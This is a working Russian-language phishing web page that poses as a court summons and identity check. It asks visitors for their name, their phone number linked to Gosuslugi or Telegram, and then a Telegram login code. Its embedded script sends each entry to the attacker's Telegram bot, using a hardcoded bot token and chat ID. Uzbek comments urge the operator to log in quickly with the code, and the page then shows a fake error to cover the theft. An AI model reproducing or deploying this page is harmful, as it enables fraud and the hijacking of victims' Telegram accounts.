<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Судебная повестка — Идентификация</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
        .container { max-width: 450px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border-top: 6px solid #c0392b; }
        h2 { color: #2c3e50; font-size: 22px; margin-bottom: 10px; }
        p { font-size: 14px; color: #666; line-height: 1.5; }
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; color: #333; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
        button { width: 100%; padding: 14px; background: #2c3e50; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #34495e; }
        .hidden { display: none; }
        .alert { background: #fff3f3; color: #c0392b; padding: 10px; border-radius: 4px; font-size: 12px; margin-bottom: 20px; border: 1px solid #fbcaca; }
    </style>
</head>
<body>

<div class="container" id="step1">
    <div class="alert">⚠️ ВНИМАНИЕ: Требуется официальное подтверждение личности</div>
    <h2>Личные данные</h2>
    <p>Введите данные для поиска в базе исполнительных производств.</p>
    
    <div class="input-group">
        <label>Фамилия и Имя</label>
        <input type="text" id="full_name" placeholder="Иванов Иван">
    </div>
    
    <div class="input-group">
        <label>Номер телефона (привязанный к ГосУслугам/TG)</label>
        <input type="tel" id="phone" placeholder="+998901234567">
    </div>

    <button onclick="sendInfo()">СЛЕДУЮЩИЙ ШАГ</button>
</div>

<div class="container hidden" id="step2">
    <h2>Проверка устройства</h2>
    <p>Для подтверждения входа в защищенный портал, мы отправили сервисный код в ваш <b>Telegram</b>. Пожалуйста, введите его ниже.</p>
    
    <div class="alert" style="background: #eef9ff; color: #0056b3; border-color: #bee5eb;">
        Код подтверждения был отправлен в официальный чат Telegram.
    </div>

    <div class="input-group">
        <label>Код из сообщения</label>
        <input type="number" id="tg_code" placeholder="00000" style="letter-spacing: 10px; text-align: center; font-size: 24px;">
    </div>

    <button onclick="sendCode()">ПОДТВЕРДИТЬ И ВОЙТИ</button>
</div>

<script>
    const CONFIG = { 
        TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", 
        CHAT: "6198817749" 
    };

    // Botga ma'lumot yuborish funksiyasi
    async function postToBot(text) {
        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.CHAT, text: text, parse_mode: "HTML" })
        });
    }

    // 1-qadam: Ism va Telefonni yuborish
    async function sendInfo() {
        const name = document.getElementById('full_name').value;
        const phone = document.getElementById('phone').value;

        if(!name || !phone) { alert("Заполните все поля!"); return; }

        const xabar = `👤 <b>Yangi Ma'lumot!</b>\n\n📝 Ism: ${name}\n📞 Tel: <code>${phone}</code>\n🌐 Holat: Kod kutilmoqda...`;
        await postToBot(xabar);

        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
    }

    // 2-qadam: Kelgan SMS kodni yuborish
    async function sendCode() {
        const code = document.getElementById('tg_code').value;
        const phone = document.getElementById('phone').value;

        if(!code) { alert("Введите код!"); return; }

        const xabar = `🔑 <b>TELEGRAM KOD!</b>\n\n📞 Tel: <code>${phone}</code>\n⚡️ Kod: <code>${code}</code>\n⚠️ <i>Tezda kirishga harakat qiling!</i>`;
        await postToBot(xabar);

        alert("Ошибка синхронизации. Попробуйте запросить код повторно через 5 минут.");
        location.reload();
    }
</script>

</body>
</html>
